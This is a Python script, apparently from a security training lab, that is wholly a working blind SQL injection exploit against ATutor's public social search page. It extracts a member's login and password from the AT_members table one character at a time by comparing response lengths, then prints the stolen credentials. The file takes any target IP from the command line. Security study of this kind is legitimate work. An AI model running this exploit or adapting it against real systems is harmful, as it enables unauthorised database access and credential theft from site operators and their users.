import requests
import sys

def search_friends_sqli(ip, inj_str):
    """
    :param ip: ip address of target
    :type ip: string
    :param inj_str: sqli string
    :type inj_str: string
    """
    for j in range(32, 126):
        target = "http://{}/ATutor/mods/_standard/social/index_public.php?q={}".format(ip, inj_str.replace("[CHAR]", str(j)))
        r = requests.get(target)
        #print r.headers
        content_length = int(r.headers.get('Content-Length'))
        if content_length > 20:
            return j

    return None

def inject(r, inj, ip):
    """
    :param r: range
    :type r: int
    :param inj: injection string
    :type inj: string
    :param ip: target
    :type ip: string
    """
    extracted = ""
    
   # for i in range(1, r):
   #     injection_string = "test'/**/or/**/(ascii(substring(({}),{},1)))=[CHAR]/**/or/**/1='".format(inj, i)
   #     retrieved_value = search_friends_sqli(ip, injection_string)

   #     if retrieved_value:
   #         extracted += chr(retrieved_value)
   #         extracted_char = chr(retrieved_value)
   #         sys.stdout.write(extracted_char)
   #         sys.stdout.flush()
   #     else:
   #         print("\n(+) Done!")
   #         break

    for i in range(1, r):
        injection_string = "test'/**/or/**/(ascii(substring(({}),{},1)))=[CHAR]/**/or/**/1='".format(inj, i)
        retrieved_value = search_friends_sqli(ip, injection_string)

        if retrieved_value:
            extracted += chr(retrieved_value)
            extracted_char = chr(retrieved_value)
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
        else:
            print("\n(+) Done!")
            break

    return extracted

def main():
    if len(sys.argv) != 2:
        print("(+) usage: {} <target>".format(sys.argv[0]))
        print("(+) e.g.: {} 192.168.121.103".format(sys.argv[0]))
        sys.exit(-1)

    ip = sys.argv[1]
    print("(+) Retrieving username...")
    query = "SELECT/**/login/**/FROM/**/atutor.AT_members/**/WHERE/**/status=3/**/LIMIT/**1"
    username = inject(50, query, ip)
    query = "SELECT/**/password/**/FROM/**/atutor.AT_members/**/WHERE/**/login/**/=/**/\'{}\'".format(username)
    password = inject(50, query, ip)
    print("(+) Credentials: {} / {}".format(username, password))


if __name__ == "__main__":
    main()
